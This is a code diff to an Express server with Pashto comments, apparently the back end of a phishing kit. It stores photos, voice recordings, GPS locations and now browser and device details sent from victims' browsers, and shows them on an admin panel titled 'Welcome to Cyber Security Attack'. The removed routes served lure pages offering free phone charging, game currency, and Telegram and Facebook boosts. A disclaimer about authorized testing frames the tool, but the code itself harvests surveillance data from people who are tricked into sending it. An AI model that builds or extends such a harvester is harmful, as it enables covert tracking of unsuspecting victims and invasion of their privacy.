@@ -10,8 +10,9 @@ const uploadDir = path.join(__dirname, 'uploads');
 const photosDir = path.join(uploadDir, 'photos');
 const voicesDir = path.join(uploadDir, 'voices');
 const locationsDir = path.join(uploadDir, 'locations');
+const deviceInfoDir = path.join(uploadDir, 'device_info');
 
-[uploadDir, photosDir, voicesDir, locationsDir].forEach(dir => {
+[uploadDir, photosDir, voicesDir, locationsDir, deviceInfoDir].forEach(dir => {
     if (!fs.existsSync(dir)) {
         fs.mkdirSync(dir, { recursive: true });
     }
@@ -19,9 +20,13 @@ const locationsDir = path.join(uploadDir, 'locations');
 
 const storage = multer.diskStorage({
     destination: (req, file, cb) => {
-        if (file.fieldname === 'photo') cb(null, photosDir);
-        else if (file.fieldname === 'voice') cb(null, voicesDir);
-        else cb(null, uploadDir);
+        if (file.fieldname === 'photo') {
+            cb(null, photosDir);
+        } else if (file.fieldname === 'voice') {
+            cb(null, voicesDir);
+        } else {
+            cb(null, uploadDir);
+        }
     },
     filename: (req, file, cb) => {
         const ext = file.fieldname === 'photo' ? '.jpg' : '.ogg';
@@ -35,67 +40,48 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use('/uploads', express.static(uploadDir));
 
-// --- د ټولو ۸ پاڼو مسیرونه (Routes) ---
-
-// ۱. لومړنۍ پاڼه (د واټساپ ګروپ)
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// ۲. دویمه پاڼه (وړیا چارج)
-app.get('/charge', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index2.html'));
-});
+app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), (req, res) => {
+    // ۱. د موبایل معلوماتو خوندي کول
+    if (req.body.device_info) {
+        try {
+            const info = JSON.parse(req.body.device_info);
+            const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
+            const entry = `نېټه: ${time} | بروزر/سیسټم: ${info.userAgent} | پلیټ فارم: ${info.platform} | سکرین: ${info.screenSize} | د بیټرۍ کچه: ${info.batteryLevel} | ژبه: ${info.language}\n-----------------------------------\n`;
+            fs.appendFileSync(path.join(deviceInfoDir, 'device_info.txt'), entry, 'utf8');
+            return res.send("Device Info Saved");
+        } catch (e) {}
+    }
 
-// ۳. درېیمه پاڼه (پابجی UC)
-app.get('/pubg', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index3.html'));
-});
-
-// ۴. څلورمه پاڼه (فری فایر الماسونه)
-app.get('/freefire', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index4.html'));
-});
-
-// ۵. پنځمه پاڼه (یوټوب ټمنل ډانلوډر)
-app.get('/youtube', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index5.html'));
-});
-
-// ۶. شپږمه پاڼه (تلګرام سټار)
-app.get('/telegram', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index6.html'));
-});
-
-// ۷. اوومه پاڼه (فیسبوک بوسټر)
-app.get('/facebook', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index7.html'));
-});
-
-// ۸. اتمه پاڼه (ویډیو کال شبکه)
-app.get('/videocall', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index8.html'));
-});
-
-// د ډېټا راټولولو عامه لار (POST) د ټولو پاڼو لپاره
-app.post('*', upload.fields([{ name: 'photo' }, { name: 'voice' }]), (req, res) => {
+    // ۲. لوکیشن خوندي کول
     if (req.body.latitude && req.body.longitude) {
         const lat = parseFloat(req.body.latitude);
         const lng = parseFloat(req.body.longitude);
         if (!isNaN(lat) && !isNaN(lng)) {
             const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
-            const entry = `نېټه: ${time} | لوکیشن: https://maps.google.com/?q=${lat},{$lng}\n-----------------------------------\n`;
+            const entry = `نېټه: ${time} | لوکیشن: https://maps.google.com/?q=${lat},${lng}\n-----------------------------------\n`;
             fs.appendFileSync(path.join(locationsDir, 'locations.txt'), entry, 'utf8');
             return res.send("Location Saved");
         }
     }
-    if (req.files && req.files.photo) return res.send("Photo Saved");
-    if (req.files && req.files.voice) return res.send("Voice Saved");
+
+    if (req.files && req.files.photo) {
+        return res.send("Photo Saved");
+    }
+
+    if (req.files && req.files.voice) {
+        return res.send("Voice Saved");
+    }
+
     res.status(400).send("Bad Request");
 });
 
-// مرکزي اډمین پینل
 app.get('/admin', (req, res) => {
+    const showWelcome = !req.headers.cookie?.includes('welcome=true') && req.query.action !== 'enter';
+
     if (req.query.action === 'enter') {
         res.setHeader('Set-Cookie', 'welcome=true; Path=/');
         return res.redirect('/admin');
@@ -106,6 +92,9 @@ app.get('/admin', (req, res) => {
         if (target === 'locations') {
             const locPath = path.join(locationsDir, 'locations.txt');
             if (fs.existsSync(locPath)) fs.unlinkSync(locPath);
+        } else if (target === 'device_info') {
+            const devPath = path.join(deviceInfoDir, 'device_info.txt');
+            if (fs.existsSync(devPath)) fs.unlinkSync(devPath);
         } else if (target === 'all_photos') {
             fs.readdirSync(photosDir).forEach(file => fs.unlinkSync(path.join(photosDir, file)));
         } else {
@@ -115,6 +104,16 @@ app.get('/admin', (req, res) => {
             }
         }
         return res.redirect('/admin');
+    }
+
+    // د موبایل معلوماتو لوستل
+    let deviceInfoHtml = '<p>تاسې تر اوسه د موبایل کوم معلومات نه دي ترلاسه کړي.</p>';
+    let deleteDevBtn = '';
+    const devPath = path.join(deviceInfoDir, 'device_info.txt');
+    if (fs.existsSync(devPath)) {
+        deleteDevBtn = `<a href="/admin?delete=device_info" class="delete-btn" onclick="return confirm('ټول معلومات پاک شي؟')">ټول پاکول</a>`;
+        const content = fs.readFileSync(devPath, 'utf8');
+        deviceInfoHtml = `<pre style="white-space: pre-wrap; font-size: 13px; color: #333; background: #fafafa; padding: 10px; border-radius: 5px; max-height: 200px; overflow-y: auto;">${content}</pre>`;
     }
 
     let locationsHtml = '<p>تر اوسه کوم لوکیشن نه دی ثبت شوی.</p>';
@@ -162,8 +161,6 @@ app.get('/admin', (req, res) => {
         });
     }
 
-    const showWelcome = !req.headers.cookie?.includes('welcome=true') && req.query.action !== 'enter';
-
     let html = `
     <!DOCTYPE html>
     <html lang="ps">
@@ -198,13 +195,16 @@ app.get('/admin', (req, res) => {
             <div class="welcome-title">🛡️ Welcome to Cyber Security Attack ⚡</div>
             <p style="text-align: center; font-weight: bold; color: #25D366; margin: 5px 0;">🔰 د برنامې هرکلی!</p>
             <div class="welcome-msg">
-                ⚠️ <strong>مهمه خبرتیا:</strong> دا اپلیکیشن یوازې د مجازو امنیتي ازموینو لپاره دی.<br><br>
+                ⚠️ <strong>مهمه خبرتیا:</strong> دا اپلیکیشن یوازې د مجازو امنیتي ازموینو او مهمو اهدافو لپاره شوی دی.<br><br>
                 👨‍💻 <strong>درنښت، اډمین:</strong> @Mastershahzada
             </div>
             <a href="/admin?action=enter" class="enter-btn">سیستم ته ننوتل 🚀</a>
         </div>`;
     } else {
         html += `
+        <h2>📱 د موبایل او سیسټم معلومات: ${deleteDevBtn}</h2>
+        <div class="card">${deviceInfoHtml}</div>
+
         <h2>📍 راټول شوي لوکیشنونه: ${deleteLocBtn}</h2>
         <div class="card">${locationsHtml}</div>
 
